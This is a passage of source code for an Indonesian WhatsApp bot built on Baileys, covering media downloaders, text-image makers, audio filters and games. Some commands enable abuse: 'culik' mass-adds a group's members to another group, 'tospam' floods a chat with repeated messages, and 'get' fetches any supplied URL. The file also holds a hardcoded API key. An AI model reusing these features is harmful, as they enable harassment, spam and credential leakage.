            await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
            .then(teks => {
                reply(teks.trim())
                fs.unlinkSync(media)
            })
            .catch(err => {
                reply(err.message)
                fs.unlinkSync(media)
            })
        } else {
            reply('Foto aja mas')
        }
        break
case 'culik':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Masukan ID Group')
let hooh = []
for (let i of groupMembers) {
hooh.push(i.jid)
}
nathan.groupAdd(args[0], hooh)
break
case 'owner':
	case 'creator':
case 'developer':
		case 'author':
let ini_list = []
for (let i of ownerNumberr) {
const vname = nathan.contacts[i] != undefined ? nathan.contacts[i].vname || nathan.contacts[i].notify : undefined
ini_list.push({
"disName": `Developer ${NamaBot}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Candy BOT;;;\nFN:${vname ? `${vname}` : `${nathan.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
nathan.sendMessage(from, {
"disName": `Developer ${NamaBot}`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: ftroli, contextInfo: { forwardingScore: 999, isForwarded: true }})
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (isQuotedSticker) {
if (!c) return reply(`Penggunaan : ${command} cmd`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Command Berhasil Ditambahkan Di Database Stickcmd")
} else {
reply('Reply Stickernya')
}
break
case 'delcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} reply stiker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Command Berhasil Dihapus Di Database Stickcmd")
break
case 'listcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
let teksnya = `\`\`\`「 LIST CMD 」\`\`\``
let comman = [];
for (let i of scommand) {
comman.push(i.id)
teksnya += `\n\n*ID :* ${i.id}\n*Command :* ${i.chats}`
}
reply(teksnya)
break
case 'bugtroli':
const baperanasw = '1000@s.whatsapp.net'
nathan.sendMessage(baperanasw, 'Candy BOT', MessageType.text)
break
				case 'script':
		case 'sc':
		case 'sourcecode':
		nathan.sendMessage(from, { text: "Tuh Diatas Bang", matchedText: 'https://youtube.com/c/ZEROBOT7', description: "", title: "Click To Get Script", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 999, isForwarded: true}, quoted: finv})
		break
       case 'debug':
			 res = await nathan.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
							"hydratedFooterText": `${NamaBot}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"disText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"disText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"disText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
nathan.relayWAMessage(res)
break
case 'debug2':
   res = await nathan.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "disText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
    "hydratedFooterText": `${NamaBot}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "disText": `Script ${NamaBot}`,
          "url": "https://youtube.com/c/ZEROBOT7"
        },
        "index": 0
      }
    ]
  }
}
}, {})
nathan.relayWAMessage(res)
break
      case 'igstory': 
              if(!c) return reply('*Masukan Username?*')
              hx.igstory(c)
             .then(async result => {
              for(let i of result.medias){
              if(i.url.includes('mp4')){
              let link = await getBuffer(i.url)
              nathan.sendMessage(from,link,video,{quoted: ftroli,caption: `Type : ${i.type}`})
              } else {
              let link = await getBuffer(i.url)
              nathan.sendMessage(from,link,image,{quoted: ftroli,caption: `Type : ${i.type}`})                  
              }
              }
              });
              break
case 'ig':
case 'igdl':
case 'instagram':
if (!c) return reply('Linknya Mana?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!c) return reply('Linknya Mana?')
var { TiktokDownloader } = require('./lib/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
                    case 'tourl':
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await nathan.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('Kirim Atau Reply Media (kecuali stiker)')
            }
            break
case 'viewonce':
res = await nathan.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": dfrply,
"viewOnce": true
}
}
}
}, {}) 
nathan.relayWAMessage(res)
break
case 'pinterest':
if (!c) return reply('Cari Apa?')
reply(mess.wait)
pinterest(`${c}`).then( data => {
const pintarr = data.result
const pintarnya = pintarr[Math.floor(Math.random() * pintarr.length)]
sendMediaURL (from ,pintarnya , `Pinterest : ${c}`)
})
break
case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
    case 'kalkulator':
        if (args.length < 1) return reply(`Kirim Perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n- Untuk Perkalian Menggunakan *\n- Untuk Pertambahan Menggunakan +\n- Untuk Pengurangan Mennggunakan -\n- Untuk Pembagian Menggunakan /`)
        mtk = body.slice(11)
        if (typeof Math_js.evaluate(mtk) !== "number") {
            reply(`"${mtk}", Bukan Angka!\nKirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n- Untuk Perkalian Menggunakan *\n- Untuk Pertambahan Menggunakan +\n- Untuk Pengurangan Mennggunakan -\n- Untuk Pembagian Menggunakan /`)
        } else {
            reply(`*「MATH」*\n\n*Hasil* : ${mtk} = ${Math_js.evaluate(mtk)}`)
        }
        break
case 'getcaption':
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 
    if (!m.quoted) return reply('Reply Pesan!')
    let qse = nathan.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('Pesan Yang Anda Kirim Tidak Mengandung Reply!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = nathan.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${nathan.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':
if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hooh|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('Maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
bohai = await nathan.searchMessages(`${ve}`, from, batas,1) 
if (bohai.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (bohai.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${bohai.messages.length - 1} Pesan`)
for (let i=1;i < bohai.messages.length;i++) {
if (bohai.messages[i].message) {
nathan.sendMessage(from, `Ini Pesannya Kaka!`, text, {quoted: bohai.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hooh|15`)
}
break
  case 'get':
case 'fetch':
            if(!c) return reply('Awali URL Dengan *https* Atau *http*')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(sate =>{
            reply(sate)
            })   
            break
            case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil Mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil Menonaktifkan autorespon`)
                } else {
                    reply(mess.error.api)
                }
            break
                case 'memegen':
									if (args.length < 1) return reply(`Kirim Perintah *${prefix + command}* teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`Kirim Perintah *${prefix + command}* teks atas|teks bawah`)
									try {
										if (!isQuotedImage && !isQuotedSticker) return reply(`Reply Gambar Atau Sticker!`)
										reply(mess.wait)
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var imgbb = require('imgbb-uploader')
										var enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										var konsol = await imgbb('3b8594f4cb11895f4084291bc655e510', media)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${konsol.display_url}`)
										nathan.sendMessage(from, resu, image, {thumbnail: dfrply, quoted: ftroli})
										fs.unlinkSync(media)
										} catch (e) {
											return reply(`${e}`)
											console.log(e)
										}
									break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Masukkan Prefix Yang Diinginkan\nOptions :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil Mengubah Prefix Ke ${c} Prefix`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil Mengubah Prefix Ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil Mengubah Prefix Ke ${c}`)
                }
                break
        case 'test':
				case 'cek':
				case 'tes':
				runtime = process.uptime()
				reply(`Aktif Sejak!!\n${waktu(runtime)}`)
				break
				case 'tictactoe':
case 'ttt':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Sesi Permainan Di Grub Ini, Harap Tunggu')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag Target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
er1 = sender
er2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = er2
ky_ttt.push({er1,er2,id,angka,gilir})
nathan.sendMessage(from, `*Memulai Game Tictactoe 🎲*

[@${er2.split('@')[0]}] Menantang Anda Untuk Menjadi Rival Anda🔥
Ketik Y/N Untuk Menerima Atau Menolak Permainan

Ketik ${prefix}delttc , Untuk Menghapus Sesi Permainan Yang Ada Di Grup!`, text, {contextInfo: {mentionedJid: [er2]}})
break
                case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Berhasil Menghapus Sesi Permainan')
break
case 'getscmd':
duda = fs.readFileSync('sticker/menu.webp')
nathan.sendMessage(from, duda, sticker, {quoted: ftroli})
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await nathan.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await nathan.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				nathan.sendMessage(from, buffer, image, {quoted: ftroli})
		} else {
		}
			  break
				case 'public':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			publik = true
				reply('「 *PUBLIC MODE* 」')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				publik = false
				reply('「 *SELF MODE* 」')
			break
		case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Cari Apa?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: ftroli, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
				case 'herolist':
await herolist().then((ress) => {
let listt = `*List Hero*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Cari Apa?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply('Cari Apa?')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: ftroli, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (args.length < 1) return reply('Linknya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf SIZE Melebihi Batas Maksimal, Silahkan Klik Link Diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File Sedang Dikirim, Silahkan Tunggu Beberapa Menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: ftroli})
break
				case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'translate':
				if (args.length < 1) return reply('Teksnya Mana?')
				transito = body.slice(11)
trans = transito.split("|")[0];
late = transito.split("|")[1];
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/translate?lang=${trans}&text=${late}&apikey=${HunterApi}`, {method: 'get'})
				teks = anu.text
reply(teks)
break
		case 'artimimpi':
				if (args.length < 1) return reply('Teksnya Mana?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya Mana?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'lirik':
if (args.length < 1) return reply('Judulnya Apa?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya Mana?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'resepmasakan':
				if (args.length < 1) return reply('Makanan Apa?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `• *${anu.results.title}* •\n\n• Porsi : ${anu.results.servings}\n• Waktu : ${anu.results.times}\n• Kesulitan : ${anu.results.dificulty}\n• Pengguna : ${anu.results.author.user}\n• Tanggal Diterbitkan : ${anu.results.author.datePublished}\n• Deskripsi : ${anu.results.desc}\n\n────────────────────\n• *Tutorial*\n\n• Bahan : ${anu.results.ingredient}\n• Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					nathan.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Username?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `• *GITHUB STALK* •\n\n• Name : ${anu.result.name}\n• Followers : ${anu.result.followers}\n• Following : ${anu.result.following}\n• ID : ${anu.result.id}\n• Node Id : ${anu.result.node_id}\n• Type : ${anu.result.type}\n• Company : ${anu.result.company}\n• Location : ${anu.result.location}\n• Bio : ${anu.result.bio}\n• Site Admin : ${anu.result.site_admin}\n• Email : ${anu.result.email}\n• Created At : ${anu.result.created_at}\n• Updated At : ${anu.result.updated_at}\n• Twitter Username : ${anu.result.twitter_username}\n• Blog : ${anu.result.blog}\n• Avatar URL : ${anu.result.avatar_url}\n• Gravatar ID : ${anu.result.gravatar_id}\n• HTML URL : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					nathan.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `• *INFO GEMPA* •\n\n• Waktu : ${anu.result.Waktu}\n• Lintang : ${anu.result.Lintang}\n• Bujur : ${anu.result.Bujur}\n• Magnitudo : ${anu.result.Magnitudo}\n• Kedalaman : ${anu.result.Kedalaman}\n• Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					nathan.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			nathan.sendMessage(from, damdu, sticker, {quoted: ftroli})
			break
				case 'robot':
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await nathan.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
nathan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: ftroli})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await nathan.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					nathan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:ftroli})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await nathan.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
nathan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:ftroli})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await nathan.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						nathan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:ftroli})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await nathan.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `DIBACA OLEH :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Terlalu Banyak!')
if (!Number(oi2)) return reply('Jumlah Harus Berupa Angka!')
	  for (let i = 0; i < oi2; i++) {
	  nathan.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = ftroli.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah Harus Berupa Angka!')
if (Number(args[0]) >= 50) return reply('Terlalu Banyak!')
	  for (let i = 0; i < args[0]; i++) {
	  nathan.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await nathan.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah Harus Berupa Angka!')
	if (Number(args[0]) >= 50) return reply('Terlalu Banyak!')
	  for (let i = 0; i < args[0]; i++) {
	  nathan.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(ftroli).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await nathan.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah Harus Berupa Angka!')
	if (Number(args[0]) >= 50) return reply('Terlalu Banyak!')
	  for (let i = 0; i < args[0]; i++) {
	  nathan.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await nathan.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Teelalu Banyak!')
	if (!Number(oi2)) return reply('Jumlah Harus Berupa Angka!')
	  for (let i = 0; i < oi2; i++) {
	  nathan.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
	if (!arg) return reply(from, `Contoh Penggunaan : ${prefix}halloween Candy BOT`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan : ${prefix}vampire Candy BOT`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt Candy BOT`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan : ${prefix}matrix Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan : ${prefix}googletxt Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan : ${prefix}spiderman Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan : ${prefix}express Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan : ${prefix}dance Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan : ${prefix}blackbird Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan : ${prefix}text3d Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan : ${prefix}warrior Candy BOT`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'd':
				case 'del':
				case 'delete':
					nathan.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await nathan.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('ERROR')
		    nathan.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: ftroli})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				case 'snk':
            send = "6287834993722@s.whatsapp.net"
            try {
    pic = await nathan.getProfilePicture(sender)
  } catch {
    pic = fs.readFileSync('./logoku.jpg')
  }
  gambar = await getBuffer(pic)
  
const syarat = (`*1.* Pengguna Dapat Menggunakan Semua Command Tanpa Batasan Limit Untuk Setiap Pengguna Dan Tidak Melakukan Spam Command Terhadap Bot.
*2.* Bot Dapat Memblokir User Melanggar Persyaratan Yang Ada Di Bot Ini, Rules Yang *WAJIB* Dipatuhi Oleh Pengguna Antara Lain :
  • Tidak Melakukan Panggilan Seluler Maupun Panggilan WhatsApp
  • Tidak Melakukan VCS
  • Tidak Melakukan Spam Command
*3.* Dilarang Keras Membuat Bot Error
*4.* Pengguna Yang Mengirim Media Atau Data Pribadi Pengguna Tidak Akan Disimpan Oleh Bot Ini, Dan Tidak Akan Bertanggung Jawab Atas Data Pribadi Tersebut!
*5.* Bot Akan Melakukan Pembersihan Chat Setiap 3 Hari Sekali, Karena Membebani Penyimpanan Bot. 

